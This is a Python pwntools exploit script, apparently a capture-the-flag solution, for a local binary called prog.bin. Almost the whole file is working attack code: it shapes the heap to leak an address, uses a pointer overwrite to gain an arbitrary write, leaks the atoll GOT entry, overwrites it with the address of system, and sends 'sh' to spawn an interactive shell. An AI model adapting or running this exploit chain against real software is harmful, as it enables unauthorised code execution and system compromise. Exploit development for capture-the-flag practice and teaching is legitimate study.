# -*- coding: latin-1 -*-
import binascii
import codecs
from pwn import *
context.binary = './prog.bin'
def bhex(digit):
    return binascii.unhexlify(str(hex(digit)[2:]))
id = 1
name = 2
payload = ""
def new(name,id):
    string = ""
    string += "1\n"
    string += str(name)+"\n"
    string += id+"\n"
    return string
def dele(id,which):
    string = ""
    string += "3\n"
    string += str(id)+"\n"
    string += str(which)+"\n"
    return string
def edit(id,which,what):
    string = ""
    which = (4,5)[which == 1]
    string += str(which)+"\n"
    string += str(id)+"\n"
    string += str(what)+"\n"
    return string
aff= "2\n"

nom=""
idd=""

r = 4
for i in range(r):
    payload += new(nom,idd)
    payload += dele(i,name)
    payload += dele(i,id)
for i in range(r):
    payload += dele(i,nom)

payload += aff
p=process("./prog.bin")
p.send(payload)

leak = p.recvlines(148)[147][24:]
leak = binascii.hexlify(leak[::-1])
leak = int(leak,16)
orig = 0x604840
# leak = 0x604840
# shift = leak - orig

id0pos = leak-0xb8
atoll = 0x602048


sid0pos = bhex(id0pos)[::-1]
satoll = bhex(atoll)[::-1]
# ssystem = "ZZZZZ"
# sid0pos = "hahahaha"

payload = edit(2,name,sid0pos) # Name can only write 7 bit, overwrite name3 pointer to id0 location
payload += edit(3,name,satoll) # Chose where id0 write

payload += aff
# print hex(orig)
# print hex(leak)
# print hex(shift)
print "id0pos: "+hex(id0pos)
print "leak adress: "+hex(leak)
print "leak +0xe8: "+hex(leak+0xe8)
# print p.recvlines(148)[147][24:]
p.send(payload)
atolladdr = p.recvlines(33)[32][23:]
atolladdr = binascii.hexlify(atolladdr[::-1])
atolladdr = int(atolladdr,16)
print(hex(atolladdr))
# print(hex(atolladdr))
system = 0xb1d0 #must be &system - &atoll from gdb
system = atolladdr+system
ssystem = bhex(system)[::-1]
print(hex(system))
payload = edit(0,id,ssystem) # Arbitrary write x820 (can only write 7 bit)
payload += "sh\n"
p.send(payload)

p.interactive()
# print payload
